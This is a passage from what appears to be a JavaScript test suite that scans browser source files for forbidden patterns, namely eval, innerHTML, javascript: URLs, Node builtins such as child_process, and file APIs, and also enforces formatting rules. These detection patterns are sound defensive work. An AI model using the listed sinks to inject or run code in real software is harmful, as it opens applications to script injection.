    expect(sourceText).not.toMatch(/dangerouslySetInnerHTML|innerHTML|eval\s*\(|new Function/);
    expect(sourceText).not.toMatch(/@tauri-apps|node:|fastify|@prisma\/client|\b(prisma|redis|pg)\b/);
    expect(sourceText).not.toMatch(/\bimport\s*\(|javascript:|https?:\/\/|<iframe|document\.write/);
    expect(sourceText).not.toMatch(/FileReader|FormData|Blob|URL\.createObjectURL|<input[^>]*\btype\s*=\s*["']file|file:\/\/|blob:|data:image/);
    expect(sourceText).not.toMatch(/componentName|executable|callbackFunction/);
    expect(sourceText).not.toMatch(/Math\.random|Date\.now|new Date\s*\(|crypto\.|setInterval\s*\(/);
    const builtins = new Set(["_http_agent", "_http_client", "_http_common", "_http_incoming", "_http_outgoing", "_http_server", "_stream_duplex", "_stream_passthrough", "_stream_readable", "_stream_transform", "_stream_wrap", "_stream_writable", "_tls_common", "_tls_wrap", "assert", "assert/strict", "async_hooks", "buffer", "child_process", "cluster", "console", "constants", "crypto", "dgram", "diagnostics_channel", "dns", "dns/promises", "domain", "events", "fs", "fs/promises", "http", "http2", "https", "inspector", "inspector/promises", "module", "net", "os", "path", "path/posix", "path/win32", "perf_hooks", "process", "punycode", "querystring", "readline", "readline/promises", "repl", "sea", "sqlite", "stream", "stream/consumers", "stream/promises", "stream/web", "string_decoder", "sys", "test", "test/reporters", "timers", "timers/promises", "tls", "trace_events", "tty", "url", "util", "util/types", "v8", "vm", "wasi", "worker_threads", "zlib"]);
    for (const match of sourceText.matchAll(/(?:\bfrom\s*|\bimport\s*|\brequire\s*\(\s*)["']([^"']+)["']/g)) {
      expect(builtins.has(match[1]), `browser import: ${match[1]}`).toBe(false);
    }
    expect(Object.keys(productSources).some((path) => path.includes("/capabilities/tickets/") && isProductionSourcePath(path))).toBe(true);
  });

  it("uses source formatting with final newlines, no carriage returns, and no trailing whitespace", () => {
    for (const [path, content] of Object.entries(formatSources)) {
      expect(content, path).toMatch(/\n$/);
      expect(content, path).not.toContain("\r");
      expect(content, path).not.toMatch(/[ \t]+$/m);
    }
  });
});
